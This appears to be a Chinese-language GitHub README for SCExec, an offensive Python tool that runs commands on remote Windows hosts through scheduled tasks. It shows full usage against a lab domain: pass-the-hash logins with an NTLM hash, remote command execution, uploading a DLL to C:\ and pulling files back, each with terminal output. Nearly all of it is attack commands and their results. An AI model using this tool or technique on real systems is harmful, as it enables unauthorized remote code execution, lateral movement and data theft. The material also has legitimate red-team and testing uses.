# SCExec

复用[TaskSchedulerMisc](https://github.com/zcgonvh/TaskSchedulerMisc/)项目的XML回显


实现了上传下载，并且命令和返回使用了简单的加密解密。

### 命令执行

```
╭─aleenzz@MacBook-Pro ~/Documents/SCExec ‹main●›
╰─$ python3 SCEXEC1.1.py redteam.lab/administrator@192.168.129.130 -hashes  :100171788f70402eb8cfddf3ea1189d0 -c " get-process | select name,id"
[!] This will work ONLY on Windows >= Vista
[*] Creating task \wpHfWTrbno
[*] Running task \wpHfWTrbno
[*] Deleting task \wpHfWTrbno
[*]
Name                                    Id
----                                    --
ADExplorer                              76
ADExplorer                            2252
ApplicationFrameHost                  1084
certsrv                               2744
ChsIME                                4276
cmd                                   3332
cmd                                   3976
cmd                                   4024
cmd                                   4456
cmd                                   5312
cmd                                   6024
cmd                                   6868
cmd                                   6928
conhost                                268
conhost                               3244
conhost                               3368
```

### 上传

目前只能上传比较小的文件，比如几十K

```
╭─aleenzz@MacBook-Pro ~/Documents/SCExec ‹main●›
╰─$ python3 SCEXEC1.1.py redteam.lab/administrator@192.168.129.130 -hashes  :100171788f70402eb8cfddf3ea1189d0 -c "put NDesk.Options.dll c:/1.dll"
[!] This will work ONLY on Windows >= Vista
[*] Creating task \CcZjRVtPxV
[*] Running task \CcZjRVtPxV
[*] Deleting task \CcZjRVtPxV
[*] None
╭─aleenzz@MacBook-Pro ~/Documents/SCExec ‹main●›
╰─$ python3 SCEXEC1.1.py redteam.lab/administrator@192.168.129.130 -hashes  :100171788f70402eb8cfddf3ea1189d0 -c "dir c:\\"                                    
[!] This will work ONLY on Windows >= Vista
[*] Creating task \dTcxAEgENy
[*] Running task \dTcxAEgENy
[*] Deleting task \dTcxAEgENy
[*]

    目录: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2021/8/13     21:44                ExchangeSetupLogs
d-----       2021/10/25     21:39                inetpub
d-----        2016/7/16     21:23                PerfLogs
d-r---        2021/11/7     21:51                Program Files
d-----        2021/11/9     21:27                Program Files (x86)
d-r---        2021/2/17     11:22                Users
d-----       2021/10/25     21:39                Windows
-a----        2023/3/21     23:47          22016 1.dll

```

### 下载

下载目前可以下载5M以内的

```
╭─aleenzz@MacBook-Pro ~/Documents/SCExec ‹main›
╰─$ python3 SCEXEC1.1.py redteam.lab/administrator@192.168.129.130 -hashes  :100171788f70402eb8cfddf3ea1189d0 -c "get C:/Users/administrator/Desktop/NDesk.Options.dll"
[!] This will work ONLY on Windows >= Vista
[*] Creating task \MLhZMIjeAB
[*] Running task \MLhZMIjeAB
[*] Deleting task \MLhZMIjeAB
[*] Download  NDesk.Options.dll
╭─aleenzz@MacBook-Pro ~/Documents/SCExec ‹main●›
╰─$ ls -al
total 120
drwxr-xr-x   7 aleenzz  staff    224  3 21 23:46 .
drwx------@ 21 aleenzz  staff    672  3 21 23:23 ..
drwxr-xr-x  13 aleenzz  staff    416  3 21 23:39 .git
-rw-r--r--   1 aleenzz  staff  22016  3 21 23:46 NDesk.Options.dll
-rw-r--r--@  1 aleenzz  staff    296  3 21 23:26 README.md
-rw-r--r--   1 aleenzz  staff  12416  3 21 23:21 SCEXEC1.1.py
-rw-r--r--   1 aleenzz  staff  12310  3 21 23:23 ScExec.py
```